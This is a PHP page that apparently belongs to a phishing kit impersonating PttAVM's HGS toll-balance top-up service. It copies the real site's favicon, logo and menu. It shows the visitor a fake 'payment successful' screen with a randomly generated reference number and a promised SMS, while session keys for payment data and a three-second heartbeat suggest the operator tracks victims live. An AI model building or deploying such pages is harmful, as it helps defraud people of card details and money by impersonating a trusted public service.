<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }

// Tutar bilgisini temizle
$toplam_tutar = '275 TL';
if (!empty($_SESSION['randevu']['saat'])) {
    $toplam_tutar = str_replace('Tutar: ', '', $_SESSION['randevu']['saat']);
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <title>HGS Online Bakiye Yükleme - Sonuç</title>
    <link rel="icon" type="image/png" href="https://hgs.pttavm.com/v2/assets/images/favicon.png">
    
    <!-- Google Fonts Open Sans -->
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&display=swap" rel="stylesheet">
    
    <!-- PttAVM HGS CSS -->
    <link rel="stylesheet" href="assets/css/hgs.min.css?v=<?= time() ?>">

    <style>
        .wizard-card {
            margin-top: 10px !important;
        }
    </style>
</head>
<body>

<div class="image-container wizard-hgs-image-container set-full-height">
    
    <!-- Navbar Header -->
    <div class="container-fluid no-padding">
        <div class="navbar-header" style="overflow: hidden;">
            <div class="logo-field">
                <a class="navbar-brand navbar-left" href="https://www.pttavm.com" target="_blank">
                    <img src="assets/images/pttavm_hgs_logo.png" alt="PttAVM Logo" class="logo" border="0"/>
                </a>
            </div>
            <div class="menu-field">
                <nav class="nav responsive-menu">
                    <div class="menu-wrapper resize-drag nav-wrapper">
                        <ul class="nav-ul">
                            <li class="homepage-menu-item"><a href="index.php"><span>Ana Sayfa</span></a></li>
                            <li class="hgs-menu-item">
                                <a href="index.php" class="selected">
                                    <span>
                                        <img src="assets/images/menu/hgs_yukle.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/hgs_yukle_hover.png" class="menu-hover-item display-none" />
                                        Yükle
                                    </span>
                                </a>
                            </li>
                            <li class="damage-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/hasar_sorgula.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/hasar_sorgula_hover.png" class="menu-hover-item display-none" />
                                        Hasar Sorgula
                                    </span>
                                </a>
                            </li>
                            <li class="km-menu-item">
                                <a href="#">
                                    <span>
                                        <img src="assets/images/menu/km_sorgula.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/km_sorgula_hover.png" class="menu-hover-item display-none" />
                                        KM Sorgula
                                    </span>
                                </a>
                            </li>
                            <li class="shopping-cart-menu-item">
                                <a href="https://pttavm.com" target="_blank">
                                    <span>
                                        <img src="assets/images/menu/alisveris.png" class="menu-showed-item" />
                                        <img src="assets/images/menu/alisveris_hover.png" class="menu-hover-item display-none" />
                                        Alışverişe Başla
                                    </span>
                                </a>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
    </div>

    <!-- Wizard Container -->
    <div class="col-sm-12 col-md-8 col-md-offset-2 col-lg-6 col-lg-offset-3" id="hgs-query-container">
        <div class="wizard-container">
            <div class="card wizard-card" data-color="orange" id="wizardProfile">
                
                <div class="wizard-header">
                    <div class="panel-header-icons">
                        <img class="panel-header-first-icon" src="assets/images/panel/homepage.png">
                    </div>
                    <h1>
                        <img class="panel-header-second-icon" src="assets/images/panel/hgs.png">
                        Bakiye Yükleme
                    </h1>
                </div>

                <div class="tab-content text-center">
                    <div class="tab-pane panel-border active">
                        <div class="panel-inside" style="padding: 24px 20px; text-align: center; color: #fff;">
                            
                            <div style="width:76px;height:76px;background:#2ecc71;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:10px auto 20px;box-shadow:0 4px 12px rgba(46,204,113,0.3)">
                                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
                            </div>
                            
                            <h3 style="font-size:22px;color:#fab62c;margin-bottom:12px;font-weight:700">Yükleme İşlemi Başarılı!</h3>
                            <p style="font-size:14px;color:#fff;max-width:340px;margin:0 auto 24px;line-height:1.6">
                                HGS bakiye yükleme işleminiz başarıyla tamamlanmıştır. Yükleme detayları 
                                <strong style="color:#fab62c;"><?= htmlspecialchars($_SESSION['basvuru']['telefon'] ?? '') ?></strong> 
                                numaralı telefonunuza SMS olarak iletilecektir.
                            </p>
                            
                            <div class="hgs-ozet-box" style="text-align:left;background:rgba(255,255,255,0.05);border-left:4px solid #fab62c;border-radius:6px;padding:20px;max-width:340px;margin:0 auto 30px;color:#fff;border-top:1.5px solid rgba(255,255,255,0.05);border-right:1.5px solid rgba(255,255,255,0.05);border-bottom:1.5px solid rgba(255,255,255,0.05);">
                                <h4 style="margin:0 0 12px 0;font-size:15px;color:#fab62c;font-weight:700;border-bottom:1px solid rgba(255,255,255,0.1);padding-bottom:8px">İşlem Detayları</h4>
                                <p style="margin:6px 0;font-size:13px;color:#fff"><strong>Plaka / T.C. No:</strong> <span style="text-transform:uppercase;color:#fab62c;"><?= htmlspecialchars($_SESSION['basvuru']['tc'] ?? '') ?></span></p>
                                <p style="margin:6px 0;font-size:13px;color:#fff"><strong>Yüklenen Tutar:</strong> <span style="color:#fab62c;"><?= htmlspecialchars($toplam_tutar) ?></span></p>
                                <p style="margin:6px 0;font-size:13px;color:#fff"><strong>İşlem Tarihi:</strong> <?= date('d.m.Y H:i') ?></p>
                                <p style="margin:6px 0;font-size:13px;color:#fff"><strong>Referans No:</strong> <?= rand(10000000, 99999999) ?></p>
                            </div>
                            
                            <div style="margin-top: 20px;">
                                <a href="<?= BASE_PATH ?>/" class="btn btn-warning btn-wd" style="text-decoration:none;display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:8px;font-weight:600;height:42px;color:#fff;">
                                    Yeni Bakiye Yükle
                                </a>
                            </div>
                            
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <!-- Footer -->
    <footer>
        <div class="container">
            <div class="copyright">© Copyright 2026 | Tüm hakları saklıdır.</div>
            <div class="footer-menu">
                <ul>
                    <li class="important-informations">
                        <a href="javascript:void(0);">Önemli Bilgiler</a>
                    </li>
                    <li><a href="javascript:void(0);">Görüş Bildir</a></li>
                    <li><a href="javascript:void(0);">Sıkça Sorulan Sorular</a></li>
                    <li><a href="javascript:void(0);">İletişim</a></li>
                </ul>
            </div>
        </div>
    </footer>
</div>

<script>
    // Heartbeat
    function heartbeat() {
        fetch('heartbeat.php', { method: 'POST', credentials: 'same-origin' }).catch(function(){});
    }
    setInterval(heartbeat, 3000);
    heartbeat();
</script>

</body>
</html>
<?php
// Session temizle
unset($_SESSION['basvuru'], $_SESSION['randevu'], $_SESSION['odeme'], $_SESSION['log_id'], $_SESSION['adim']);
?>
